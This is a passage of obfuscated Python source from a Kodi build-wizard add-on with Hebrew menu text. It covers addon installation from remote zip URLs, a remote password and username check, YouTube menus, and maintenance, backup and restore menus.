							if os .path .exists (OO0OOOOO00OOO0O0O ):#line:2500
								OOOOOO000O00O00O0 ="[COLOR green][Installed][/COLOR] %s"%OOOOOO000O00O00O0 #line:2501
						except :#line:2502
							pass #line:2503
						O0000OOO000000OOO +=1 #line:2504
						addFile (OOOOOO000O00O00O0 ,'addoninstall',OO0O0OO000O0OO0O0 ,OOO00O000000O0OO0 ,description =O0O0OOO0O0O0O00OO ,icon =OOOOOO00O00O0O0OO ,fanart =OOOO0O0O0000OO0OO ,themeit =THEME2 )#line:2505
					if O0000OOO000000OOO <1 :#line:2506
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2507
			else :#line:2508
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2509
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2510
		else :#line:2511
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2512
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2513
			addFile ('%s'%OOO0O0O00OO0OOO00 ,'',themeit =THEME3 )#line:2514
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2515
	setView ('files','viewType')#line:2516
def addonInstaller (O000O00OO000OO0OO ,OOO0OO0O00O000O00 ):#line:2518
	if not ADDONFILE =='http://':#line:2519
		O0OOOO0O00000O0O0 =wiz .workingURL (OOO0OO0O00O000O00 )#line:2520
		if O0OOOO0O00000O0O0 ==True :#line:2521
			O0OOO0OO0OOOO00O0 =wiz .openURL (OOO0OO0O00O000O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2522
			OO000O00OOO0OO0O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O00OO000OO0OO ).findall (O0OOO0OO0OOOO00O0 )#line:2523
			if len (OO000O00OOO0OO0O0 )>0 :#line:2524
				for OO0O00O0000O0000O ,OOO0OO0O00O000O00 ,O00OO00OO00OOO00O ,O0O0O0O0O000OOOO0 ,OO0O0000OOOO0O0O0 ,O0O0OO0OO0OO000O0 ,O0O0O00OO00OOO0OO ,OOO0000O0OOO0OOO0 ,O00OO00OO000OO00O in OO000O00OOO0OO0O0 :#line:2525
					if os .path .exists (os .path .join (ADDONS ,O000O00OO000OO0OO )):#line:2526
						OOO00OO0000OO000O =['Launch Addon','Remove Addon']#line:2527
						OO00O00O00OOOOO00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO00OO0000OO000O )#line:2528
						if OO00O00O00OOOOO00 ==0 :#line:2529
							wiz .ebi ('RunAddon(%s)'%O000O00OO000OO0OO )#line:2530
							xbmc .sleep (1000 )#line:2531
							return True #line:2532
						elif OO00O00O00OOOOO00 ==1 :#line:2533
							wiz .cleanHouse (os .path .join (ADDONS ,O000O00OO000OO0OO ))#line:2534
							try :wiz .removeFolder (os .path .join (ADDONS ,O000O00OO000OO0OO ))#line:2535
							except :pass #line:2536
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O00OO000OO0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2537
								removeAddonData (O000O00OO000OO0OO )#line:2538
							wiz .refresh ()#line:2539
							return True #line:2540
						else :#line:2541
							return False #line:2542
					O0O0OO00O00OOO0OO =os .path .join (ADDONS ,O00OO00OO00OOO00O )#line:2543
					if not O00OO00OO00OOO00O .lower ()=='none'and not os .path .exists (O0O0OO00O00OOO0OO ):#line:2544
						wiz .log ("Repository not installed, installing it")#line:2545
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O000O00OO000OO0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OO00OO00OOO00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2546
							OOO0000O0O0O00O0O =wiz .parseDOM (wiz .openURL (O0O0O0O0O000OOOO0 ),'addon',ret ='version',attrs ={'id':O00OO00OO00OOO00O })#line:2547
							if len (OOO0000O0O0O00O0O )>0 :#line:2548
								O0O00O0O00OOO000O ='%s%s-%s.zip'%(OO0O0000OOOO0O0O0 ,O00OO00OO00OOO00O ,OOO0000O0O0O00O0O [0 ])#line:2549
								wiz .log (O0O00O0O00OOO000O )#line:2550
								if KODIV >=17 :wiz .addonDatabase (O00OO00OO00OOO00O ,1 )#line:2551
								installAddon (O00OO00OO00OOO00O ,O0O00O0O00OOO000O )#line:2552
								wiz .ebi ('UpdateAddonRepos()')#line:2553
								wiz .log ("Installing Addon from Kodi")#line:2555
								OOO000O0000O0O0O0 =installFromKodi (O000O00OO000OO0OO )#line:2556
								wiz .log ("Install from Kodi: %s"%OOO000O0000O0O0O0 )#line:2557
								if OOO000O0000O0O0O0 :#line:2558
									wiz .refresh ()#line:2559
									return True #line:2560
							else :#line:2561
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OO00OO00OOO00O )#line:2562
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O000O00OO000OO0OO ,O00OO00OO00OOO00O ))#line:2563
					elif O00OO00OO00OOO00O .lower ()=='none':#line:2564
						wiz .log ("No repository, installing addon")#line:2565
						OOO0O00O00OOOOO00 =O000O00OO000OO0OO #line:2566
						O00000OO00OOOOO0O =OOO0OO0O00O000O00 #line:2567
						installAddon (O000O00OO000OO0OO ,OOO0OO0O00O000O00 )#line:2568
						wiz .refresh ()#line:2569
						return True #line:2570
					else :#line:2571
						wiz .log ("Repository installed, installing addon")#line:2572
						OOO000O0000O0O0O0 =installFromKodi (O000O00OO000OO0OO ,False )#line:2573
						if OOO000O0000O0O0O0 :#line:2574
							wiz .refresh ()#line:2575
							return True #line:2576
					if os .path .exists (os .path .join (ADDONS ,O000O00OO000OO0OO )):return True #line:2577
					OO0000000O0O0OOOO =wiz .parseDOM (wiz .openURL (O0O0O0O0O000OOOO0 ),'addon',ret ='version',attrs ={'id':O000O00OO000OO0OO })#line:2578
					if len (OO0000000O0O0OOOO )>0 :#line:2579
						OOO0OO0O00O000O00 ="%s%s-%s.zip"%(OOO0OO0O00O000O00 ,O000O00OO000OO0OO ,OO0000000O0O0OOOO [0 ])#line:2580
						wiz .log (str (OOO0OO0O00O000O00 ))#line:2581
						if KODIV >=17 :wiz .addonDatabase (O000O00OO000OO0OO ,1 )#line:2582
						installAddon (O000O00OO000OO0OO ,OOO0OO0O00O000O00 )#line:2583
						wiz .refresh ()#line:2584
					else :#line:2585
						wiz .log ("no match");return False #line:2586
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2587
		else :wiz .log ("[Addon Installer] Text File: %s"%O0OOOO0O00000O0O0 )#line:2588
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2589
def installFromKodi (OOO000O0000OOO0O0 ,over =True ):#line:2591
	if over ==True :#line:2592
		xbmc .sleep (2000 )#line:2593
	wiz .ebi ('RunPlugin(plugin://%s)'%OOO000O0000OOO0O0 )#line:2595
	if not wiz .whileWindow ('yesnodialog'):#line:2596
		return False #line:2597
	xbmc .sleep (1000 )#line:2598
	if wiz .whileWindow ('okdialog'):#line:2599
		return False #line:2600
	wiz .whileWindow ('progressdialog')#line:2601
	if os .path .exists (os .path .join (ADDONS ,OOO000O0000OOO0O0 )):return True #line:2602
	else :return False #line:2603
def installAddon (OOOO0OO00OOO0OO00 ,OOOO00O00O0OOO0OO ):#line:2605
	if not wiz .workingURL (OOOO00O00O0OOO0OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOO0OO00OOO0OO00 ,COLOR2 ));return #line:2606
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2607
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO00OOO0OO00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2608
	OO00OO0OOOOO0OO00 =OOOO00O00O0OOO0OO .split ('/')#line:2609
	OO0OO000O00000OOO =os .path .join (PACKAGES ,OO00OO0OOOOO0OO00 [-1 ])#line:2610
	try :os .remove (OO0OO000O00000OOO )#line:2611
	except :pass #line:2612
	downloader .download (OOOO00O00O0OOO0OO ,OO0OO000O00000OOO ,DP )#line:2613
	O00OO0000O00000OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO00OOO0OO00 )#line:2614
	DP .update (0 ,O00OO0000O00000OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2615
	O00OOOO0000000OO0 ,O00OOO000000O00O0 ,O00OOOOOO0OO00000 =extract .all (OO0OO000O00000OOO ,ADDONS ,DP ,title =O00OO0000O00000OO )#line:2616
	DP .update (0 ,O00OO0000O00000OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2617
	installed (OOOO0OO00OOO0OO00 )#line:2618
	installDep (OOOO0OO00OOO0OO00 ,DP )#line:2619
	DP .close ()#line:2620
	wiz .ebi ('UpdateAddonRepos()')#line:2621
	wiz .ebi ('UpdateLocalAddons()')#line:2622
	wiz .refresh ()#line:2623
def installDep (O00OO00OO0000O00O ,DP =None ):#line:2625
	O0OO0OOOOO000000O =os .path .join (ADDONS ,O00OO00OO0000O00O ,'addon.xml')#line:2626
	if os .path .exists (O0OO0OOOOO000000O ):#line:2627
		O0000OO0O0OO0OOOO =open (O0OO0OOOOO000000O ,mode ='r');OOOO0OOO0000O00OO =O0000OO0O0OO0OOOO .read ();O0000OO0O0OO0OOOO .close ();#line:2628
		O00OOO0OOOO0OOOOO =wiz .parseDOM (OOOO0OOO0000O00OO ,'import',ret ='addon')#line:2629
		for OO0O0OOOO00OO00OO in O00OOO0OOOO0OOOOO :#line:2630
			if not 'xbmc.python'in OO0O0OOOO00OO00OO :#line:2631
				if not DP ==None :#line:2632
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O0OOOO00OO00OO ))#line:2633
				wiz .createTemp (OO0O0OOOO00OO00OO )#line:2634
def installed (OOOOOO0OO0O0OO0O0 ):#line:2661
	OOO0OOOOO00O00000 =os .path .join (ADDONS ,OOOOOO0OO0O0OO0O0 ,'addon.xml')#line:2662
	if os .path .exists (OOO0OOOOO00O00000 ):#line:2663
		try :#line:2664
			OO0OO0O0OOOOO0O00 =open (OOO0OOOOO00O00000 ,mode ='r');O0O0000000O0000O0 =OO0OO0O0OOOOO0O00 .read ();OO0OO0O0OOOOO0O00 .close ()#line:2665
			O0O000OOOO0OO0O0O =wiz .parseDOM (O0O0000000O0000O0 ,'addon',ret ='name',attrs ={'id':OOOOOO0OO0O0OO0O0 })#line:2666
			OO0O0OO0OO0OO0O00 =os .path .join (ADDONS ,OOOOOO0OO0O0OO0O0 ,'icon.png')#line:2667
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O000OOOO0OO0O0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0O0OO0OO0OO0O00 )#line:2668
		except :pass #line:2669
def youtubeMenu (url =None ):#line:2671
	if not YOUTUBEFILE =='http://':#line:2672
		if url ==None :#line:2673
			O0O000000000O0000 =wiz .workingURL (YOUTUBEFILE )#line:2674
			O000000O00O0O000O =uservar .YOUTUBEFILE #line:2675
		else :#line:2676
			O0O000000000O0000 =wiz .workingURL (url )#line:2677
			O000000O00O0O000O =url #line:2678
		if O0O000000000O0000 ==True :#line:2679
			O0O0O000O00OOOOOO =wiz .openURL (O000000O00O0O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2680
			OOOOO000O0O000OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0O000O00OOOOOO )#line:2681
			if len (OOOOO000O0O000OOO )>0 :#line:2682
				for O00O0OO0OOO00O000 ,O0O00OOOO0OOOOO0O ,url ,O0O00O0OOO0O00O0O ,O00OOOOO00000O00O ,O0O000OOOOO0000O0 in OOOOO000O0O000OOO :#line:2683
					if O0O00OOOO0OOOOO0O .lower ()=="yes":#line:2684
						addDir ("[B]%s[/B]"%O00O0OO0OOO00O000 ,'youtube',url ,description =O0O000OOOOO0000O0 ,icon =O0O00O0OOO0O00O0O ,fanart =O00OOOOO00000O00O ,themeit =THEME3 )#line:2685
					else :#line:2686
						addFile (O00O0OO0OOO00O000 ,'viewVideo',url =url ,description =O0O000OOOOO0000O0 ,icon =O0O00O0OOO0O00O0O ,fanart =O00OOOOO00000O00O ,themeit =THEME2 )#line:2687
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2688
		else :#line:2689
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2690
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2691
			addFile ('%s'%O0O000000000O0000 ,'',themeit =THEME3 )#line:2692
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2693
	setView ('files','viewType')#line:2694
def STARTP ():#line:2695
	O0000O00O00O0OO0O =(ADDON .getSetting ("pass"))#line:2696
	if BUILDNAME =="":#line:2697
	 if not NOTIFY =='true':#line:2698
          O0000000O0OOOOOO0 =wiz .workingURL (NOTIFICATION )#line:2699
	 if not NOTIFY2 =='true':#line:2700
          O0000000O0OOOOOO0 =wiz .workingURL (NOTIFICATION2 )#line:2701
	 if not NOTIFY3 =='true':#line:2702
          O0000000O0OOOOOO0 =wiz .workingURL (NOTIFICATION3 )#line:2703
	OOO0OO0000O000OOO =O0000O00O00O0OO0O #line:2704
	O0000000O0OOOOOO0 =urllib2 .Request (SPEED )#line:2705
	O0000O0O000O000OO =urllib2 .urlopen (O0000000O0OOOOOO0 )#line:2706
	O00OOOOOOO0OO00O0 =O0000O0O000O000OO .readlines ()#line:2708
	O000O0O00000OOO0O =0 #line:2712
	for OO00OO000OO000O0O in O00OOOOOOO0OO00O0 :#line:2713
		if OO00OO000OO000O0O .split (' ==')[0 ]==O0000O00O00O0OO0O or OO00OO000OO000O0O .split ()[0 ]==O0000O00O00O0OO0O :#line:2714
			O000O0O00000OOO0O =1 #line:2715
			break #line:2716
	if O000O0O00000OOO0O ==0 :#line:2717
					O00OOO00OO000OO0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2718
					if O00OOO00OO000OO0O :#line:2720
						ADDON .openSettings ()#line:2722
						sys .exit ()#line:2724
					else :#line:2725
						sys .exit ()#line:2726
	return 'ok'#line:2730
def STARTP2 ():#line:2731
	O0O0O0000O000O000 =(ADDON .getSetting ("user"))#line:2732
	OOOO0OOO000OOOOOO =(UNAME )#line:2734
	OOOO0000OOOOOO000 =urllib2 .urlopen (OOOO0OOO000OOOOOO )#line:2735
	O0O00O0O0000OO0OO =OOOO0000OOOOOO000 .readlines ()#line:2736
	O0O000O00O000000O =0 #line:2737
	for O000O0OO00OO0O000 in O0O00O0O0000OO0OO :#line:2740
		if O000O0OO00OO0O000 .split (' ==')[0 ]==O0O0O0000O000O000 or O000O0OO00OO0O000 .split ()[0 ]==O0O0O0000O000O000 :#line:2741
			O0O000O00O000000O =1 #line:2742
			break #line:2743
	if O0O000O00O000000O ==0 :#line:2744
		OOO00O00O0O0OOOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2745
		if OOO00O00O0O0OOOOO :#line:2747
			ADDON .openSettings ()#line:2749
			sys .exit ()#line:2752
		else :#line:2753
			sys .exit ()#line:2754
	return 'ok'#line:2758
def passandpin ():#line:2759
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2760
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2761
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2762
def passandUsername ():#line:2763
	ADDON .openSettings ()#line:2764
def folderback ():#line:2767
    OOO0OOOO00OO00000 =ADDON .getSetting ("path")#line:2768
    if OOO0OOOO00OO00000 :#line:2769
      OOO0OOOO00OO00000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2770
      ADDON .setSetting ("path",OOO0OOOO00OO00000 )#line:2771
def backmyupbuild ():#line:2774
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2786
def maintMenu (view =None ):#line:2790
	OO0000O00O000O000 ='[B][COLOR green]ON[/COLOR][/B]';O000OO0O000O000OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2792
	O00OO00O00O0OOO0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2793
	OOOO00O000O00000O ='true'if AUTOCACHE =='true'else 'false'#line:2794
	O0OO0OOO0000O000O ='true'if AUTOPACKAGES =='true'else 'false'#line:2795
	OO0000OO0O0O0OO0O ='true'if AUTOTHUMBS =='true'else 'false'#line:2796
	O0O000000O0O0O0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2797
	O0OOO00OO0O00OO00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2798
	O00O0O0OO0OO00000 ='true'if INCLUDEALL =='true'else 'false'#line:2799
	O00O00O0OO000000O ='true'if THIRDPARTY =='true'else 'false'#line:2800
	if wiz .Grab_Log (True )==False :O000OO0OO0OOOO000 =0 #line:2801
	else :O000OO0OO0OOOO000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2802
	if wiz .Grab_Log (True ,True )==False :OO0OOOO0OOOO0000O =0 #line:2803
	else :OO0OOOO0OOOO0000O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2804
	OOO00000OOOO0000O =int (O000OO0OO0OOOO000 )+int (OO0OOOO0OOOO0000O )#line:2805
	O0OOO0O00O0OO00OO =str (OOO00000OOOO0000O )+' Error(s) Found'if OOO00000OOOO0000O >0 else 'None Found'#line:2806
	OO00OO0OO00OO0OO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2807
	if O00O0O0OO0OO00000 =='true':#line:2808
		O0OO00OO0OO00000O ='true'#line:2809
		O000OO0OO0OOOO00O ='true'#line:2810
		OO0O00O00OO0O0000 ='true'#line:2811
		OO00OO0O000000O0O ='true'#line:2812
		O000OO0OOOO0OO0O0 ='true'#line:2813
		O00OO0OOOO00000OO ='true'#line:2814
		OO00O0O000OOOOO0O ='true'#line:2815
		O0OO0O00000000OO0 ='true'#line:2816
	else :#line:2817
		O0OO00OO0OO00000O ='true'if INCLUDEBOB =='true'else 'false'#line:2818
		O000OO0OO0OOOO00O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2819
		OO0O00O00OO0O0000 ='true'if INCLUDESPECTO =='true'else 'false'#line:2820
		OO00OO0O000000O0O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2821
		O000OO0OOOO0OO0O0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2822
		O00OO0OOOO00000OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2823
		OO00O0O000OOOOO0O ='true'if INCLUDESALTS =='true'else 'false'#line:2824
		O0OO0O00000000OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2825
	O00OOOO000OOO00OO =wiz .getSize (PACKAGES )#line:2826
	OOOOOOOOOO0000O0O =wiz .getSize (THUMBS )#line:2827
	O0OO00000000OO0O0 =wiz .getCacheSize ()#line:2828
	O00000OOOO0O000OO =O00OOOO000OOO00OO +OOOOOOOOOO0000O0O +O0OO00000000OO0O0 #line:2829
	OO0OO00OO0O0O0O0O =['Daily','Always','3 Days','Weekly']#line:2830
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2831
	if view =="clean"or SHOWMAINT =='true':#line:2832
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00000OOOO0O000OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO00000000OO0O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOOO000OOO00OO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOOOOOO0000O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2840
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2841
	if view =="addon"or SHOWMAINT =='false':#line:2842
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="misc"or SHOWMAINT =='true':#line:2851
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('View Errors in Log: %s'%(O0OOO0O00O0OO00OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Clear Wizard Log File%s'%OO00OO0OO00OO0OO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2860
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2861
	if view =="backup"or SHOWMAINT =='true':#line:2862
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2875
	if view =="tweaks"or SHOWMAINT =='true':#line:2876
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2877
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		else :#line:2879
			if os .path .exists (ADVANCED ):#line:2880
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2881
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2882
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2889
	addFile ('Show All Maintenance: %s'%O0O000000O0O0O0O0 .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2890
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2891
	addFile ('Third Party Wizards: %s'%O00O00O0OO000000O .replace ('true',OO0000O00O000O000 ).replace ('false',O000OO0O000O000OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2892
	if O00O00O0OO000000O =='true':#line:2893
		OOO0000OO00OO0O0O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2894
		OOOOO00O00OO0000O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2895
		O0OOO000OOOO0O000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2896
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0000OO00OO0O0O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO00O00OO0000O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOO000OOOO0O000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2899
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2900
